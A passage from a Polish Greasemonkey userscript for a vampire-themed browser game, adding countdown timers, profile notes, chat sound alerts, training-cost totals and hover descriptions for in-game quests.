          pozniej.setSeconds(pozniej.getSeconds() + parseInt(bldtime));
          rok = pozniej.getFullYear();
          miesiac = pozniej.getMonth() + 1;
          dzien = pozniej.getDate();
          godzina = pozniej.getHours();
          minuty = pozniej.getMinutes();
          sekundy = pozniej.getSeconds();
          GM_setValue(id + 'UM_brok', rok);
          GM_setValue(id + 'UM_bmiesiac', miesiac);
          GM_setValue(id + 'UM_bdzien', dzien);
          GM_setValue(id + 'UM_bgodzina', godzina);
          GM_setValue(id + 'UM_bminuty', minuty);
          GM_setValue(id + 'UM_bsekundy', sekundy);
          pozniej = new Date();
          pozniej.setTime((unsafeWindow.serverTime + bldtime) * 1000); //pozniej.getTime()+unsafeWindow.timeDiff*1000);
          bld[0].innerHTML += '<br>Data ukończenia: <span class="bldtimeleft">' + pozniej + '</span>';
        } else {
          GM_setValue(id + 'UM_brok', - 1);
          GM_setValue(id + 'UM_bmiesiac', 0);
          GM_setValue(id + 'UM_bdzien', 0);
          GM_setValue(id + 'UM_bgodzina', 0);
          GM_setValue(id + 'UM_bminuty', 0);
          GM_setValue(id + 'UM_bsekundy', 0);
          GM_setValue(id + 'UM_bld', false);
        }
      }
      if ('t' != a[a.length - 1] && '?a=profile&uid=' == a.substring(0, 15)) {
        divs = document.getElementsByTagName('div');
        user = a.substring(15);
        i = 29;
        if (divs[i].innerHTML.length < 400) i++;
        divs[i].innerHTML += '<fieldset class="profile" style="text-align: center; height: 150px;"><legend class="profile">NOTATKI</legend><textarea id="UM_notka' + user + '" style="width: 100%; height: 96%;">' + GM_getValue(id + 'UM_notka' + user, '') + '</textarea></fieldset>';
        teraz = new Date();
        teraz.setTime(unsafeWindow.serverTime * 1000); //teraz.getTime()+unsafeWindow.timeDiff*1000);
        teraz = teraz.getDate() + '/' + (teraz.getMonth() + 1) + '/' + teraz.getFullYear();
        testa = GM_getValue(id + 'UM_1_' + user, 'A:B').split(':') [1];
        testb = GM_getValue(id + 'UM_2_' + user, 'C:D').split(':') [1];
        if (testa == testb && testb == teraz) document.getElementsByTagName('BODY') [0].innerHTML = document.getElementsByTagName('BODY') [0].innerHTML.replace('NAPADNIJ', '<s>NAPADNIJ</s>');
         else if (testa == teraz || testb == teraz && testa != testb) document.getElementsByTagName('BODY') [0].innerHTML = document.getElementsByTagName('BODY') [0].innerHTML.replace('NAPADNIJ', 'NAPADNIJ 2GI RAZ');
        document.getElementById('UM_notka' + user).addEventListener('keyup', function () {
          GM_setValue(id + 'UM_notka' + user, this.value);
        }, false);
      }
      if (a == '?a=training' || a == '?a=training&do=stats') {
        // mod zliczanie kosztu trenu
        suma = 0;
        for (var i = 1; i <= document.getElementById('stat_str').innerHTML; i++) suma += Math.ceil(10 * Math.pow(1.2, i - 1));
        for (var i = 1; i <= document.getElementById('stat_dex').innerHTML; i++) suma += Math.ceil(10 * Math.pow(1.2, i - 1));
        for (var i = 1; i <= document.getElementById('stat_def').innerHTML; i++) suma += Math.ceil(10 * Math.pow(1.2, i - 1));
        for (var i = 1; i <= document.getElementById('stat_lok').innerHTML; i++) suma += Math.ceil(10 * Math.pow(1.2, i - 1));
        for (var i = 1; i <= document.getElementById('stat_chr').innerHTML; i++) suma += Math.ceil(10 * Math.pow(1.2, i - 1));
        for (var i = 1; i <= document.getElementById('stat_rep').innerHTML; i++) suma += Math.ceil(10 * Math.pow(1.2, i - 1));
        for (var i = 1; i <= document.getElementById('stat_per').innerHTML; i++) suma += Math.ceil(10 * Math.pow(1.2, i - 1));
        for (var i = 1; i <= document.getElementById('stat_int').innerHTML; i++) suma += Math.ceil(10 * Math.pow(1.2, i - 1));
        for (var i = 1; i <= document.getElementById('stat_wis').innerHTML; i++) suma += Math.ceil(10 * Math.pow(1.2, i - 1));
        t = 0;
        suma2 = '';
        suma = suma + '';
        for (i = suma.length - 1; i >= 0; i--) {
          suma2 = suma[i] + suma2;
          t++;
          if (t == 3) {
            t = 0;
            suma2 = ' ' + suma2;
          }
        }
        version = document.getElementById('content-mid');
        ver2 = document.createElement('SPAN');
        ver2.innerHTML = '<br><center>W SUMIE W TRENINGU: &nbsp;&nbsp;&nbsp;<b>' + suma2 + '</b></center>';
        version.appendChild(ver2, version.firstChild);
      }
      if (GM_getValue(id + 'UM_OP_donesound', false)) {
        //	unsafeWindow.refLinks.spy_0 += '<audio src="'+GM_getValue(id+'UM_urlsound','http://mega.szajb.us/juenizer/unmod/sound.mp3')+'" autoplay=true></audio>';
        //	unsafeWindow.refLinks.spy_1 += '<audio src="'+GM_getValue(id+'UM_urlsound','http://mega.szajb.us/juenizer/unmod/sound.mp3')+'" autoplay=true></audio>';
        //	unsafeWindow.refLinks.spy_2 += '<audio src="'+GM_getValue(id+'UM_urlsound','http://mega.szajb.us/juenizer/unmod/sound.mp3')+'" autoplay=true></audio>';
        //	unsafeWindow.refLinks.spy_3 += '<audio src="'+GM_getValue(id+'UM_urlsound','http://mega.szajb.us/juenizer/unmod/sound.mp3')+'" autoplay=true></audio>';
        //	unsafeWindow.refLinks.spy_4 += '<audio src="'+GM_getValue(id+'UM_urlsound','http://mega.szajb.us/juenizer/unmod/sound.mp3')+'" autoplay=true></audio>';
        //	unsafeWindow.refLinks.spy_5 += '<audio src="'+GM_getValue(id+'UM_urlsound','http://mega.szajb.us/juenizer/unmod/sound.mp3')+'" autoplay=true></audio>';
        //	unsafeWindow.refLinks.quest_timeleft+='<audio src="'+GM_getValue(id+'UM_urlsound','http://mega.szajb.us/juenizer/unmod/sound.mp3')+'" autoplay=true></audio>';
        //	unsafeWindow.refLinks.atkTime+='<audio src="'+GM_getValue(id+'UM_urlsound','http://mega.szajb.us/juenizer/unmod/sound.mp3')+'" autoplay=true ></audio>';
      }
      var scriptCode = new Array(); // this is where we are going to build our new script
      scriptCode.push('function sboxRefreshMsgIcon(type) {');
      if (GM_getValue(id + 'UM_OP_clansound', true)) {
        scriptCode.push('if (sboxNewMsg[type] == true) { if (type==\'clan\') { notification(\'Nowa wiadomość na kanale KLANOWYM\'); if (document.getElementById(\'audioid\')) { elem = document.getElementById(\'audioid\'); elem.parentNode.removeChild(elem); }; document.body.appendChild( document.createElement( \'div\')); document.body.lastChild.innerHTML = \'<audio id="audioid" src="' + GM_getValue(id + 'UM_urlclansound', 'http://www.sounds4email.com/wav/hex4.mp3') + '" autoplay=true></audio>\' } };');
      }
      if (GM_getValue(id + 'UM_OP_globalsound', true)) {
        scriptCode.push('if (sboxNewMsg[type] == true) { if (type==\'global\') { notification(\'Nowa wiadomość na kanale GLOBALNYM\'); if (document.getElementById(\'audioid\')) { elem = document.getElementById(\'audioid\'); elem.parentNode.removeChild(elem); }; document.body.appendChild( document.createElement( \'div\')); document.body.lastChild.innerHTML = \'<audio id="audioid" src="' + GM_getValue(id + 'UM_urlglobalsound', 'http://www.sounds4email.com/wav/hex4.mp3') + '" autoplay=true></audio>\' } };');
      }
      scriptCode.push('$$(\'sbox_msg_\'+type+\'_img\').src = \'gfx/sbox_msg\'+ ((sboxNewMsg[type] == true) ? \'_new\' : \'\') + \'.png\'; }');
      var script = document.createElement('script'); // create the script element
      script.innerHTML = scriptCode.join('\n'); // add the script code to it
      scriptCode.length = 0; // recover the memory we used to build the script
      document.getElementsByTagName('head') [0].appendChild(script);
      if (GM_getValue(id + 'UM_OP_shoutboxclan', false)) {
        // mod shoutboxa
        document.getElementById('sbox_icons_clan').click();
        document.getElementById('sbox_msg_clan').style.opacity = '0.85';
        document.getElementById('sbox_msg_global').style.opacity = '0.85';
      }      // mod czas exp i kw wszedzie

      krok = GM_getValue(id + 'UM_krok', - 1);
      k = false;
      var n_kw = false;
      var teraz = new Date();
      teraz.setTime(unsafeWindow.serverTime * 1000); //teraz.getTime()+unsafeWindow.timeDiff*1000);
      if (krok != - 1) {
        pozniejk = new Date(GM_getValue(id + 'UM_krok', 0), GM_getValue(id + 'UM_kmiesiac', 0) - 1, GM_getValue(id + 'UM_kdzien', 0), GM_getValue(id + 'UM_kgodzina', 0), GM_getValue(id + 'UM_kminuty', 0), GM_getValue(id + 'UM_ksekundy', 0));
        var roznicak = pozniejk.getTime() - teraz.getTime();
        if (roznicak > 0) {
          k = true;
          var i2 = setInterval(function () {
            roznicak -= 1000;
            if (roznicak <= 0) {
              if (!n_kw) {
                n_kw = true;
                notification('KW dobiegło końca');
              }
              document.getElementById('kw').innerHTML = 'FINISH!';
              roznicak = 0;
              clearInterval(i2);
            } else {
              timek = roznicak;
              var days = Math.floor(timek / 86400000);
              var hours = Math.floor((timek - (86400000 * days)) / 3600000);
              if (hours < 10) hours = '0' + hours;
              var minutes = Math.floor((timek - (86400000 * days) - (3600000 * hours)) / 60000);
              if (minutes < 10) minutes = '0' + minutes;
              var seconds = (timek - (86400000 * days) - (3600000 * hours) - (60000 * minutes)) / 1000;
              seconds = Math.floor(seconds);
              if (seconds < 10) seconds = '0' + seconds;
              document.getElementById('kw').innerHTML = hours + ':' + minutes + ':' + seconds;
            }
          }, 1000);
        }
      }
      erok = GM_getValue(id + 'UM_erok', - 1);
      e = false;
      var n_exp = false;
      if (erok != - 1) {
        poznieje = new Date(GM_getValue(id + 'UM_erok', 0), GM_getValue(id + 'UM_emiesiac', 0) - 1, GM_getValue(id + 'UM_edzien', 0), GM_getValue(id + 'UM_egodzina', 0), GM_getValue(id + 'UM_eminuty', 0), GM_getValue(id + 'UM_esekundy', 0));
        var roznicae = poznieje.getTime() - teraz.getTime();
        if (roznicae > 0) {
          e = true;
          var i = setInterval(function () {
            roznicae -= 1000;
            if (roznicae <= 0) {
              if (!n_exp) {
                n_exp = true;
                notification('Expedycja dobiegła końca');
              }
              document.getElementById('exp').innerHTML = 'FINISH!';
              roznicae = 0;
              clearInterval(i);
            } else {
              timee = roznicae;
              var days = Math.floor(timee / 86400000);
              var hours = Math.floor((timee - (86400000 * days)) / 3600000);
              if (hours < 10) hours = '0' + hours;
              var minutes = Math.floor((timee - (86400000 * days) - (3600000 * hours)) / 60000);
              if (minutes < 10) minutes = '0' + minutes;
              var seconds = (timee - (86400000 * days) - (3600000 * hours) - (60000 * minutes)) / 1000;
              seconds = Math.floor(seconds);
              if (seconds < 10) seconds = '0' + seconds;
              document.getElementById('exp').innerHTML = hours + ':' + minutes + ':' + seconds;
            }
          }, 1000);
        }
      }
      brok = GM_getValue(id + 'UM_brok', - 1);
      b = false;
      var n_bud = false
      if (brok != - 1) {
        poznieje = new Date(GM_getValue(id + 'UM_brok', 0), GM_getValue(id + 'UM_bmiesiac', 0) - 1, GM_getValue(id + 'UM_bdzien', 0), GM_getValue(id + 'UM_bgodzina', 0), GM_getValue(id + 'UM_bminuty', 0), GM_getValue(id + 'UM_bsekundy', 0));
        var roznicab = poznieje.getTime() - teraz.getTime();
        if (roznicab > 0) {
          b = true;
          var i3 = setInterval(function () {
            roznicab -= 1000;
            if (roznicab <= 0) {
              if (!n_bud) {
                n_bud = true;
                notification('Budowa budynku dobiegła końca');
              }
              document.getElementById('unmodbld').innerHTML = 'FINISH!';
              roznicab = 0;
              clearInterval(i3);
            } else {
              timeb = roznicab;
              var days = Math.floor(timeb / 86400000);
              var hours = Math.floor((timeb - (86400000 * days)) / 3600000);
              if (hours < 10) hours = '0' + hours;
              var minutes = Math.floor((timeb - (86400000 * days) - (3600000 * hours)) / 60000);
              if (minutes < 10) minutes = '0' + minutes;
              var seconds = (timeb - (86400000 * days) - (3600000 * hours) - (60000 * minutes)) / 1000;
              seconds = Math.floor(seconds);
              if (seconds < 10) seconds = '0' + seconds;
              if (days) document.getElementById('unmodbld').innerHTML = days + 'd ' + hours + ':' + minutes + ':' + seconds;
               else document.getElementById('unmodbld').innerHTML = hours + ':' + minutes + ':' + seconds;
            }
          }, 1000);
        }
      }
      arok = GM_getValue(id + 'UM_arok', - 1);
      au = false;
      var n_auk = false;
      if (arok != - 1) {
        poznieje = new Date(GM_getValue(id + 'UM_arok', 0), GM_getValue(id + 'UM_amiesiac', 0) - 1, GM_getValue(id + 'UM_adzien', 0), GM_getValue(id + 'UM_agodzina', 0), GM_getValue(id + 'UM_aminuty', 0), GM_getValue(id + 'UM_asekundy', 0));
        var roznicaa = poznieje.getTime() - teraz.getTime();
        if (roznicaa > 0) {
          au = true;
          var i4 = setInterval(function () {
            roznicaa -= 1000;
            if (roznicaa <= 0) {
              if (!n_auk) {
                n_auk = true;
                notification('Obserwowana aukcja prawdopodobnie dobiegła końca');
              }
              document.getElementById('unmodauk').innerHTML = 'FINISH?';
              roznicaa = 0;
              clearInterval(i4);
            } else {
              timea = roznicaa;
              przypomnienie = timea / 1000;
              if (przypomnienie == 3 * 60) {
                notification('Uwaga: prawdopodobny koniec aukcji za 3 minuty!');
              } else
              if (przypomnienie == 2 * 60) {
                notification('Uwaga: prawdopodobny koniec aukcji za 2 minuty!');
              } else
              if (przypomnienie == 1 * 60) {
                notification('Uwaga: prawdopodobny koniec aukcji za 1 minute!');
              }
              var days = Math.floor(timea / 86400000);
              var hours = Math.floor((timea - (86400000 * days)) / 3600000);
              if (hours < 10) hours = '0' + hours;
              var minutes = Math.floor((timea - (86400000 * days) - (3600000 * hours)) / 60000);
              if (minutes < 10) minutes = '0' + minutes;
              var seconds = (timea - (86400000 * days) - (3600000 * hours) - (60000 * minutes)) / 1000;
              seconds = Math.floor(seconds);
              if (seconds < 10) seconds = '0' + seconds;
              if (days) document.getElementById('unmodauk').innerHTML = days + 'd ' + hours + ':' + minutes + ':' + seconds;
               else document.getElementById('unmodauk').innerHTML = hours + ':' + minutes + ':' + seconds;
            }
          }, 1000);
        }
      }
      div = document.getElementsByClassName('remark') [0];
      div.innerHTML += '&nbsp;';
      if (e) div.innerHTML += '<a href="?a=cevent"><span style="color: red;">&nbsp;EXP:</span> <span  class="enabled" id="exp">00:00:00</span></a>&nbsp;&nbsp;';
      if (k) div.innerHTML += '<a href="?a=swr"><span style="color: red;">KW:</span> <span  class="enabled" id="kw">00:00:00</span></a>&nbsp;&nbsp;';
      if (b) div.innerHTML += '<a href="?a=build"><span style="color: red;">BUDOWA:</span> <span  class="enabled" id="unmodbld">00:00:00</span></a>&nbsp;&nbsp;';
      if (au) div.innerHTML += '<a href="?a=auction"><span style="color: red;">AUKCJA:</span> <span class="enabled" id="unmodauk">00:00:00</span></a>&nbsp;&nbsp;';
      if (GM_getValue(id + 'UM_OP_alarm', false)) {
        i0 = '';
        if (GM_getValue(id + 'UM_OP_alarm_h', 0) < 10) i0 = '0';
        i1 = '';
        if (GM_getValue(id + 'UM_OP_alarm_m', 0) < 10) i1 = '0';
        div.innerHTML += '<span id="alarm" style="color: red;">ALARM: ' + i0 + GM_getValue(id + 'UM_OP_alarm_h', 0) + ':' + i1 + GM_getValue(id + 'UM_OP_alarm_m', 0) + '</span>';
        setInterval(function () {
          if (GM_getValue(id + 'UM_OP_alarm', false)) {
            teraz = new Date();
            teraz.setTime(unsafeWindow.serverTime * 1000); //teraz.getTime()+unsafeWindow.timeDiff*1000);
            h = teraz.getHours();
            m = teraz.getMinutes();
            if (parseInt(h) == GM_getValue(id + 'UM_OP_alarm_h', 0) && GM_getValue(id + 'UM_OP_alarm_m', 0) == parseInt(m)) {
              GM_setValue(id + 'UM_OP_alarm_on', true);
              GM_setValue(id + 'UM_OP_alarm', false);
            }
          }
        }, 1000);
      }
      if (a == '?a=training&do=evo') {
      }
      if (a == '?a=tasks') {
        function juenOpis(text, text2) {
          document.getElementsByTagName('BODY') [0].innerHTML = document.getElementsByTagName('BODY') [0].innerHTML.replace(text, '<span class="lnk" onmouseover="return overlib(\'' + text2 + '\',HAUTO,WIDTH,500,CAPTIONFONTCLASS,\'action-caption\',TEXTFONTCLASS,\'overlibText overlibExtended\',VAUTO,CAPTION,\'OPIS ZADANIA\');" onmouseout="nd();">' + text + '</span>');
        }        // s2 (opisy zbieral Prime Lust - https://docs.google.com/document/d/1eMFHEc0ieY_254Qsjs-90peIv2olOjEYpvsVYC1wQSU/edit?pli=1

        juenOpis('Zdobądź poziom 80.', 'W wypadku gdy mamy poziom wyższy, wystarczy wbić jeszcze jeden by zaliczyło zadanie.');
        juenOpis('Udowodnij swój zmysł do biznesu. Wybuduj Cmentarz oraz Bank Krwi.', 'Gdy mamy wybudowany, wystarczy podnieść o 1 poziom by zaliczyło zadanie.');
        juenOpis('Zdobądź serca i umysły tłumu. Osiągnij 50 pkt. charyzmy.', 'Gdy mamy już wymaganą wartość cechy, wystarczy podnieść o 1, bądź awansować o 1 poziom,  by zaliczyło zadanie.');
        juenOpis('Zakon Świętego Benedykta wysłał przeciwko Tobie skrytobójcę. Znajdź go w Okolicach Miasta.', 'Na przeciwnika trafiamy na bliskiej wyprawie, dosyć łatwe to zaliczenia.');
        juenOpis('Zostań władcą ciemnych zaułków Miasta. Osiągnij 55 pkt. wpływów.', 'Gdy mamy już wymaganą wartość cechy, wystarczy podnieść o 1.');
        juenOpis('Twój kwadrat został najechany przez paladynów z Zakonu Świętego Benedykta. Przygotuj się na ostateczną bitwę między Światłem i Ciemnością...', 'Zadanie oblężeniowe - NIE wbijamy arkan gdyż przeciwnicy mają wyssanie mocy na poziomie +10.');
        juenOpis('Wielki Mistrz Zakonu uszedł z życiem z poprzedniej batalii. Znajdziesz go gdzieś na zakazanym pustkowiu. Udaj się tam i ofiaruj mu szansę spotkania z jego bogiem...', 'Pielgrzymka - mocny pajac do ubicia, 10% że na niego trafimy.');
        juenOpis('Zostań Władcą Miasta. Tu i teraz.', 'Należy awansować do pierwszej strefy.');
        juenOpis('Pan Ciemności wymaga, aby w jego Katedrze nigdy nie brakowało krwi. Jako członek Wewnętrznego Kręgu jesteś zobowiązany do złożenia ofiary. Zgromadź 800 000 litrów krwi, po czym złóż ofiarę 10% tej wartości.', 'Zbieramy zasoby, klikamy link, zadanie wykonane.');
        juenOpis('Pan Ciemności wymaga, aby w jego Katedrze nigdy nie brakowało krwi. Jako członek Wewnętrznego Kręgu jesteś zobowiązana do złożenia ofiary. Zgromadź 800 000 litrów krwi, po czym złóż ofiarę 10% tej wartości.', 'Zbieramy zasoby, klikamy link, zadanie wykonane.');
        juenOpis('Prawdziwe doświadczenie można zdobyć tylko przemierzając niebezpieczne szlaki. Wykonaj co najmniej 15 udanych pielgrzymek w nieznane.', 'Wykonujemy 15 udanych pielgrzymek będąc na 2s. Licznik jest podany przy zadaniu. ');
        juenOpis('Dotarły do Ciebie plotki o dziwnej anomalii, znajdującej się gdzieś na pustkowiach. Znajdź i wyjaśnij tajemnicze zjawisko.', 'Pielgrzymka, gdzie wynik jest średnią testu inteligencji i wiedzy.');
        juenOpis('Twoi ludzie donieśli, że przy rabusiu zabitym w okolicach miasta znaleziono list. Z listu wynika, że twoja prawnuczka Anhala więziona jest na Polach Lęgowych. Zorganizuj ekspedycję ratunkową.', 'Zakładamy Ekspedycję na Lokację zwaną Pola Lęgowe (losowa lokacja) gdzie ubić mamy Gargulce. Podobnie jak z Duchem jest 10% ze na nie trafimy');
        juenOpis('Całe miasto patrzy na członków Rady. Daj znak swej wielkości i zapewnij krew dla swoich poddanych. Rozbuduj Szpital na poziom 7 oraz Rzeźnie na poziom 22.', 'Gdy oba mamy wybudowane, wystarczy podnieść z nich o 1 poziom by zaliczyło zadanie.');
        juenOpis('Sława to nie wszystko, wampiry podążą tylko za kimś naprawdę potężnym. Zdobądź 84 poziom.', 'W wypadku gdy mamy poziom wyższy, wystarczy wbić jeszcze jeden by zaliczyło zadanie.');
        // s3 (opisy zbieral Prime Lust - https://docs.google.com/document/d/1eMFHEc0ieY_254Qsjs-90peIv2olOjEYpvsVYC1wQSU/edit?pli=1
        juenOpis('Wykonaj wszystkie Pielgrzymki w Nieznane.', 'W przypadku, gdy są już wykonane, wystarczy zaliczyć dowolną by zaliczyło zadanie.');
        juenOpis('W nieznanych zakątkach pustkowia Wilczy Król zbiera stada, by się z Tobą rozprawić. Zakradnij się do jego siedliska i skróć jego męki. Legendy głoszą, że zabić go można tylko srebrną kulą...', 'Na Wilczego Króla idziemy na pielgrzymkę. Bunkier + mocna broń palna polecane.');
        juenOpis('Zdobądź poziom 50.', 'W wypadku gdy mamy poziom wyższy, wystarczy wbić jeszcze jeden by zaliczyło zadanie.');
        juenOpis('Wybuduj wszystkie budynki z trzeciej strefy.', 'Gdy mamy wybudowane, wystarczy podnieść dowolny by zaliczyło zadanie.');
        juenOpis('Od dawna wiadomo, że najlepszą obroną jest atak. Rozbuduj Sklep z Bronią do 5 poziomu.', 'Gdy mamy wybudowany, wystarczy podnieść o 1 poziom by zaliczyło zadanie.');
        juenOpis('Ostatnio przeciwnicy zawsze są o krok przed Tobą. Rozbuduj Dziennik Lokalny do 4 poziomu, by skutecznie przeciwdziałać wrogim szpiegom.', 'Gdy mamy wybudowany, wystarczy podnieść o 1 poziom by zaliczyło zadanie.');
        juenOpis('Twoi agenci odkryli kryjówkę wrogiej szajki szpiegowskiej. Zajmują jedną z kamienic w Twoim kwadracie. Zorganizuj oblężenie i wybij ich jak robaki.', 'Zadanie oblężeniowe - obojętnie którą opcję wybieramy je zakładając.');
        juenOpis('Od samego początku byłeś pewny, że ten czas kiedyś nastanie... Dostań się do Rady, awansując do Drugiej Strefy!', 'Ze strefy 3 należy udać się do strefy 2.');
        juenOpis('Od samego początku byłaś pewna, że ten czas kiedyś nastanie... Dostań się do Rady, awansując do Drugiej Strefy!', 'Ze strefy 3 należy udać się do strefy 2.');
        juenOpis('Obowiązkiem każdego wampira wysokiej rangi jest dostarczenie ludzi do posługi w Katedrze. Zbierz 500 000 ludzi i oddaj Katedrze w ofierze 10% z nich.', 'Zbieramy ludzi, klikamy w link, zadanie wykonane :)');
        juenOpis('Minęło już wiele dni, odkąd Twój syn wyruszył na wyprawę w nieznane, a Ty nadal nie otrzymałeś od niego żadnych wieści. Pełen niepokoju postanawiasz udać się na poszukiwania.', 'Pielgrzymka ze testem gdzie wynik procentowy jest średnią wiedzy i inteligencjii, mamy 10% szans że trafimy na ten test.');
        juenOpis('Minęło już wiele dni, odkąd Twój syn wyruszył na wyprawę w nieznane, a Ty nadal nie otrzymałaś od niego żadnych wieści. Pełna niepokoju postanawiasz udać się na poszukiwania.', 'Pielgrzymka ze testem gdzie wynik procentowy jest średnią wiedzy i inteligencjii, mamy 10% szans że trafimy na ten test.');
        juenOpis('Wpływy, władza, splendor... aby to wszystko utrzymać, potrzebujesz pieniędzy. Aby pokryć swoje zwiększone wydatki, musisz zwiększyć swoje dochody. Rozbuduj dom publiczny na poziom 14.', 'Gdy mamy wybudowany, wystarczy podnieść o 1 poziom by zaliczyło zadanie.');
        juenOpis('Twoja pozycja, sława i bogactwo sprawiły, że jesteś uważany za jednego z bardziej wpływowych wampirów w mieście. Jeden z członków Rady poprosił Ciebie o pomoc w zniszczeniu szajki mutantów pustoszących szlaki handlowe do miasta.', 'Daleka wyprawa - należy zgładzić mutanta (Czy trafi się herszt, czy jeden z popleczników to loteria. Dużo sposta/zwinki + ogrom dmg zalecane), 10% że trafimy na przeciwnika.');
        juenOpis('Twoja pozycja, sława i bogactwo sprawiły, że jesteś uważana za jednego z bardziej wpływowych wampirów w mieście. Jeden z członków Rady poprosił Ciebie o pomoc w zniszczeniu szajki mutantów pustoszących szlaki handlowe do miasta.', 'Daleka wyprawa - należy zgładzić mutanta (Czy trafi się herszt, czy jeden z popleczników to loteria. Dużo sposta/zwinki + ogrom dmg zalecane), 10% że trafimy na przeciwnika.');
        juenOpis('Dokonaj heroicznego czynu. Tylko to przyciągnie pod Twój sztandar potężne wampiry.', 'Należy zaliczyć dowolną pielgrzymkę.');
        // s4 (opisy zbieral Prime Lust - https://docs.google.com/document/d/1eMFHEc0ieY_254Qsjs-90peIv2olOjEYpvsVYC1wQSU/edit?pli=1
        juenOpis('Jest kilka sposobów zdobywania reputacji w świecie umarlaków. Jednym z nich jest posiadanie potężnych artefaktów. Ukończ łącznie 4 Pielgrzymki w Nieznane.', 'Zaliczyć 4 pielgi. W wypadku gdy mamy już zaliczone więcej, a dopiero odblokowaliśmy zadanie wystarczy zaliczyć dowolną pielgrzymkę');
        juenOpis('Masz pieniądze i wiesz jak je zdobywać. Teraz musisz zyskać reputację wśród Trzody. Podnieś poziom Pośredniaka do 15 poziomu.', 'Gdy zadanie nie jest zaliczone, wystarczy podnieść o 1 poziom pośredniak.');
        juenOpis('Przywódca okolicznego stada wilkołaków poprzysiągł Ci zemstę za zniszczenie watahy w Twoim kwadracie. Najlepiej zrobisz, znajdując jego kryjówkę gdzieś Daleko od Miasta i kończąc jego mizerną egzystencję.', 'Należy zgładzić przeciwnika na Dalekiej Wyprawie.');
        juenOpis('Ludzie w Twoim kwadracie zaczęli zapadać na dziwną chorobę. Twoi szpiedzy sugerują, byś szukał odpowiedzi w Okolicach Miasta.', 'Walka z Ghullami - ze zwględu na wysoką odporność zaleca się ponad 50zwinki oraz broń biała, min 6 ataków. ');
        juenOpis('Ludzie w Twoim kwadracie zaczęli zapadać na dziwną chorobę. Twoi szpiedzy sugerują, byś szukała odpowiedzi w Okolicach Miasta.', 'Walka z Ghullami - ze zwględu na wysoką odporność zaleca się ponad 50zwinki oraz broń biała, min 6 ataków. ');
        juenOpis('Zdobądź poziom 35.', 'W wypadku gdy mamy poziom wyższy, wystarczy wbić jeszcze jeden by zaliczyło zadanie.');
        juenOpis('Gdy byłeś na wyprawie, wampir-uzurpator zajął Twoją siedzibę. Odbij ją wraz z członkami klanu.', 'Zadanie oblężeniowe - obojętnie którą opcję wybieramy je zakładając.');
        juenOpis('Gdy byłaś na wyprawie, wampir-uzurpator zajął Twoją siedzibę. Odbij ją wraz z członkami klanu.', 'Zadanie oblężeniowe - obojętnie którą opcję wybieramy je zakładając.');
        juenOpis('Wybuduj wszystkie budynki ze strefy czwartej.', 'Gdy mamy wybudowane, wystarczy podnieść dowolny by zaliczyło zadanie.');
        juenOpis('Władza!! Awansuj do strefy Trzeciej. I zasiądź w Wewnętrznym Kręgu.', 'Ze strefy 4 należy udać się do strefy 3.');
        juenOpis('Jak nakazuje wampirza tradycja, każdy nowo mianowany Inkwizytor wyprawia wystawną ucztę, na którą zaprasza wszystkich mieszkańców miasta. Wampir twojej rangi musi wykazać się bogactwem i hojnością. Zgromadź na swoim koncie 5 000 000 PLN i złóż ofiarę w wysokości 10% tej sumy.', 'Zbieramy kasę, klikamy w link i zalicza zadanie.');
        juenOpis('Twoi zwiadowcy poinformowali Cię o dziwnych zjawiskach zachodzących na Wielkim Stepie. Sugerują, żebyś zbadał sytuację zanim będzie za późno.', 'Expedycja na Wielki Step (lokacja Hydry) - mamy 10% na trafienie na Ducha (minimum 140zwinki 70 sposta 8000HP)');
        juenOpis('Twoi zwiadowcy poinformowali Cię o dziwnych zjawiskach zachodzących na Wielkim Stepie. Sugerują, żebyś zbadała sytuację zanim będzie za późno.', 'Expedycja na Wielki Step (lokacja Hydry) - mamy 10% na trafienie na Ducha (minimum 140zwinki 70 sposta 8000HP)');
        juenOpis('Ważne osobistości mają zawsze wielu wrogów, dlatego przydaje się dodatkowa ochrona. Rozbuduj Posterunek Policji na 18 poziom i Schronisko na 14 poziom.', 'Gdy mamy wybudowane, wystarczy podnieść dowolny by zaliczyło zadanie.');
        juenOpis('Kolejne zmasakrowane ciała, ludzie okrutnie pozbawieni wnętrzności, korpusy bez głów. Co się dzieje? Wyślij szpiegów do swojego kwadratu i sprawdź kto za tym stoi.', 'Należy przeszpiegować skutecznie swój kwadrat (dowolna opcja, szansa na udane szpiegowanie i tak wynosi JEDEN procent), powtarzać do skutku.');
        juenOpis('Informacje uzyskane od młodego człowieka prowadzą do karczmy na przedmieściach miasta. Wraz z grupą innych wampirów sprawdźcie, co tam się dzieje.', 'Oblężenie na Miecz Inkwizycji - liczba przeciwników to 26-28 (mocna ekipa białasów 180 zwinki i palniaków 110 sposta).');
        juenOpis('Gdy obudziłeś się wieczorem, na biurku znalazłeś dziwny list. Poznaczony śladami krwi, zawierał w sobie tylko słowa: "Ratuj", "Uwięziona" i "Daleko". Pisane w pośpiechu, w różnych miejscach pergaminu. Cóż to może oznaczać?', 'Należy wykonać udaną daleką (10% szans ze trafimy na ten test), gdzie testem jest średnia Zwinności i Intela.');
        juenOpis('Gdy obudziłaś się wieczorem, na biurku znalazłeś dziwny list. Poznaczony śladami krwi, zawierał w sobie tylko słowa: "Ratuj", "Uwięziona" i "Daleko". Pisane w pośpiechu, w różnych miejscach pergaminu. Cóż to może oznaczać?', 'Należy wykonać udaną daleką (10% szans ze trafimy na ten test), gdzie testem jest średnia Zwinności i Intela.');
        juenOpis('Wykaż się męstwem. Tylko to przyciągnie pod Twój sztandar wytrawnych łowców.', 'Wykonaj daleką wyprawę');
        // s5
        juenOpis('Twój stan majątkowy budzi nasz niepokój, Akolito. Masz za zadanie rozbudować Dom Publiczny do 3 poziomu.', 'Jeśli nie spełniasz wymagań, może warto jest skorzystać z opcji burzenia?');
        juenOpis('Krew jest źródłem naszej siły. Dokonaj rozbudowy Rzeźni do 5 poziomu. ', 'Należy wybudować rzeźnie na piąty poziom, jeśli mamy już taki osiągniety wystarczy wybudować poziom wyżej.');
        juenOpis('Zdobądź 10 poziom.', 'Osiągnij 10 poziom swojej postaci. Wystarczy wykonywać ataki oraz wyprawy.');
        juenOpis('Groźny mutant przedostał się ze strefy zewnętrznej, trzeba go znaleźć i powstrzymać zanim wyrządzi więcej szkód. Na jego trop możesz wpaść, przeszukując Okolice Miasta.', 'Masz szanse na trafienie tego przeciwnika na bliskich wyprawach.');
        juenOpis('Zbadaj dokładnie Okolice Miasta. ', 'Wykonaj (pozytywnie) wszystkie wyprawy bliskie,');
